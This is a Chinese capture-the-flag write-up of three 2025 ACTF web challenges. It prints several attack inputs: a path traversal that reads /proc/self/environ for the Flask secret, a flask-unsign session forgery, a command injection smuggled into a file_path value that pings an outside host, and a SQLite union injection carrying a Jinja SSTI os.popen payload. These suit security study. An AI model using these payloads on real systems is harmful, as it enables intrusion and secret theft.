# 2025 ACTF Web 复现

> 作者：妙尽璇机 | 来源：[GitHub Pages](https://changeyourway.github.io/2025/04/30/CTF/2025%20ACTF%20Web%20WP/)

| 题目 | 核心考点 |
|------|---------|
| upload | Flask 任意文件读 → 环境变量泄露 secret_key → `flask-unsign` 伪造 admin session → 命令注入 (base64 cmd) |
| Excellent-Site | SQLite 注入 + SMTP Subject SSTI + Bot 本地访问触发模板渲染 |
| eznote | Express + EJS + Pandoc format 参数注入 + DOMPurify 绕过 |

## upload — Flask 命令注入 + Session 伪造

通过 `?file_path=../../../../../../../../proc/self/environ` 读取环境变量，获取 Flask `secret_key`：

```bash
flask-unsign --sign --secret S3cRetK3y --cookie '{"username": "admin"}'
```

admin 登录后 `os.system(f'base64 {file_path} > /tmp/{file_path}.b64')` 触发命令注入：

```
?file_path=2>nul & chcp 65001 > nul & ping xxxx.zaza.eu.org &::
```

## Excellent-Site — SQLite 注入 → SSTI via Email Subject

1. `/news?id=-1+union+select+"{{config.__class__.__init__.__globals__['os'].popen('...').read()}}"`
2. 通过 `/report` 发送邮件，Subject 设置为 SQLi URL
3. `/bot` 访问 `/admin` → 解析邮件 Subject → `fetch_page_content` → `render_template_string` SSTI

## eznote — Pandoc Format 参数注入

Express + EJS 模板引擎，Pandoc 转换 markdown。format 参数限制 `^[0-9a-zA-Z]{1,10}$` 但仍可注入。
